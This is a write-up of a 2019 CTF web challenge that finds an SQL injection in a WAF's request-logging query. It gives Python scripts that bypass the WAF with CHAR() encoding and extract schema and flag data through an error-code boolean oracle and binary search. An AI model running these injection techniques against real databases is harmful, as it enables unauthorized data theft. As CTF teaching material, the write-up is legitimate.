description: This is an old writeup for the web challenge mod_insecurity in the 2019 CyberChallenge ctf
---

This was one of the web challenges for the cyberchallenge ctf that took place in Italy in 2019.
I had a lot of fun solving it, and at the time i also drafted a writeup for it
but i never got around publishing it until now


## the challenge

> mod_insecurity 2.0 is a web application firewall (WAF) module fo the NGINX reverse proxy. It provides automatic SQLi protection using smart heuristics and the latest advancements in machine learning and blockchain technologies.
> modinsecurity.cyberchallenge.it

By visiting the link, we are presented with a simple 'SaaS landing page template', that repeats the same marketing pitch that was
in the challenge description. There is also a 'demo' section that says:

> Demo:
> You are already running it!
> Try to attack this page and see all your attempts fail!

And sure enough, at the end of the page there is a contact form. It's the only interactive
element on the website, so it's clear that we 
have to use it to perform some kind of sql injection

The form makes a POST request to the same origin, `modinsecurity.cyberchallenge.it`,
with a couple of parameters: username, email, phone, and message

## Looking for a vulnerability

After a couple of attempts with burp, i managed to trigger the waf by entering
`-- 'or 1=1` in one of the form fields


<Picture src="modinsecurity-waf" height={450} alt="A bright red web page showing an error message: Your request have been blocked! We detected an attept to attack this website.  mod_insecurity online protectionâ„¢ blocked your request.  Your request have been logged. Logged requests: 17265 " />

<br/>


The challenge didn't provide any backend code, so it was time to formulate
an hypothesis on how the backend works.

I created a simple python script to automate the form submission, so that all the
tests could be easily documented and reproduced just by changing the `q` variable


```python
import requests

#this triggers the waf
q = " -- ' or 1=1"

url = 'http://modinsecurity.cyberchallenge.it/'
myobj = {
        'name': q,
        'email': "asd",
        'phone': "asdas",
        'message': "aasdasd"
        }
x = requests.post(url, data = myobj)
print(x.text)
```

After some trial and error, i managed to find a working hypothesis

```python
# only specific form fields are logged when they are detected as dangerous
# when a string is logged, ' is replaced with \'
# could be something like
# INSERT INTO log '$query', 'asd'

# WORKS! this triggers the waf AND a real mysql error.
q="\\' -- ' or 1=1 "
#therefore the query cannot be
#INSERT INTO log 'asdasd', '$data'
#INSERT INTO log 'asdasd', '\\' -- ' or 1=1 '

#The idea now is to find a query at the sx of --
#that won't trigger an sql error
q="\\') -- ' or 1=1 "
#this doesn't throw an sql error, therefore the query is probably
#INSERT INTO logs (asd, asdsd) VALUES (213, '$ata')
#INSERT INTO logs (asd, asdsd) VALUES (213, '\\') -- ' or 1=1 ')

q="\\',12) -- ' or 1=1 "
#this payload confirms the hypothesis, since sql returns a new error code:
# 1136 (column count doesnt match value count)
# this fits the theory that the query is
#INSERT INTO logs (asd, asdsd) VALUES (213, '$ata')
#INSERT INTO logs (asd, asdsd) VALUES (213, '\\',12) -- ' or 1=1 ')
```

The waf has a blacklist of dangerous words, that is tested against each form input.
When an input matches the blacklist (it can be something as simple as ` --' or 1`)
The error page is returned, and the offending query is logged.
The logging process is the following:

- get the offending forminput data
- replace any `'` with `\'` in the data
- execute the sql query:

```sql
INSERT INTO logs (col1, col2) VALUES (timestampprobably, '$data')
```

where $data is replaced with the actual forminput data, without a prepared statement.
We have our sql injection.

## Exploiting the sql injection

now that we have an sql injection, we need to exploit it. Unfortunately, the only
output that we can get from the backend is sql error codes, without any description.

After some considerations, i decided to try a boolean-based injection, using the
returned sql error codes:

```python
#this payload returns an error 1048: column can't be null
#only if the condition inside the if is true
a = "if(1=1, null, char(43))"
q= f"asd\\' LIKE {a} ) -- ' or 1=1 "

# An example in practice
a="(select CHAR(45) from information_schema.tables limit 70,1)"
q= f"asd\\' LIKE {a} ) -- ' or 1=1 "
#returns error 1048 if the query defined in 'a' didn't return any row
```

With this confirmed working, finding the flag is just a matter of writing
some sql queries and some boilerplate code that will help us with the binary search.

Let's start from the boilerplate code:

```python

def S(string):
    """ turns a string into a quoteless string that bypasses waf rules """
    return "CONCAT("+charify(string)+")"

def charify(string):
  string_without_first_char = string[1:]
  first_char = string[0]
  result = "CHAR({})".format(ord(first_char))
  for c in string_without_first_char:
    result += ",CHAR({})".format(ord(c))
  return result

def query(query):
    """ Execute a sql query
    return the sql error, or 0 if none was generated
    1048: cant be null
    1064: syntax error
    0:    no sql error returned
    """
    url = 'http://modinsecurity.cyberchallenge.it/'
    myobj = {'name': '', 'email': '', 'phone': query, 'message': ''}
    x = requests.post(url, data = myobj)
    if "MySQL Error" in x.text:
        errline = x.text.split("\n")[0]
        errCode = errline.split(" ")[-1][0:4]
        return errCode
    return "0"

def binsearch(binTest):
    """ Decorator function, that facilitates binary serch queries 
    @argument: a function(char givenChar, int givenPosition) that must execute
               a query and return true if the char at the given position 
               is < of the given char
    @returns: a function(int startIndex=0) that will execute a binary search,
              printing the result in real time
    """
    def retFunc(startIndex=0):
        def binWalk(i):
            span = []
            for c in range(ord(','), ord('}')+1):
                span.append(chr(c))
            while len(span) >= 2:
                middle = len(span)//2
                if binTest(span[middle], i):
                    span = span[:middle]
                else:
                    span = span[middle:]
            return span[0]

        res = ""
        retCommaCount = 0
        i = startIndex
        while retCommaCount < 5:
            i += 1
            print("searching letter ant index ", i)
            resC = binWalk(i)
            if resC == ",":
                retCommaCount += 1
            else:
                retCommaCount = 0
            res  += resC
            print("==found== ",res)
    return retFunc

```

Yes, this is a lot of boilerplate code, and yes this is painful to read.
But it's stuff i wrote long ago, and hey it works

### Getting the tables

Now, let's move to our first query. The goal is to enumerate all the tables in the database.
This is normally done with this query

```sql
SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE'
```

Which can be modified to work with the binary search decorator in this way:

```python
from boilerplate import S, query, binsearch

@binsearch
def get_all_tables(confront_char, positionInString):
    confront_char = ord(confront_char) #use for binary sarch
    get_char = f"(SELECT ORD(SUBSTRING(group_concat(TABLE_NAME), {positionInString},1)) FROM INFORMATION_SCHEMA.tables where TABLE_TYPE = {S('BASE TABLE')} )"
    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
    ret = query(q, False)
    return ret == "0"

get_all_tables()

```

When executed, this outputs:

```text
Logs, Settings
```

### Getting the table schema

A small change to the previous function allows us to retrieve the columns in both tables

```python
from boilerplate import S, query, binsearch

@binsearch
def get_columns(confront_char, positionInString):
    confront_char = ord(confront_char) #use for binary sarch
    tableName = S('Logs')
    get_char = f"(SELECT ord(SUBSTRING(group_concat(COLUMN_NAME), {positionInString}, 1)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = {tableName})"
    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
    ret = query(q, False)
    return ret == "0"


get_columns()

```

This reveals that the columns in Settings are `s_key, s_value`
and the columns in Logs are ` id,tstamp,ipaddr,payload `

### Getting the flag

The settings table looks interesting, let's read its content:

```python
from boilerplate import S, query, binsearch

@binsearch
def get_content(confront_char, positionInString):
    confront_char = ord(confront_char) #use for binary sarch
    get_char = f"(SELECT ord(SUBSTRING(group_concat(s_value), {positionInString}, 1)) FROM Settings)"
    boolean_oracle = f"if(( {get_char} < {confront_char} ), char(43), null)"
    q= f"asd\\' LIKE {boolean_oracle} ) -- ' or 1=1 "
    ret = query(q, False)
    return ret == "0"



get_content()

```

This reveals the content of the column s_key:
`mod_insecurity_app_token, mod_insecurity_license`

Applying the same search for the s_value column finally reveals the flag
`ccit{Be435b52CE33SWPG83SH5xRfr3oHialL},sD9Gq97Q`
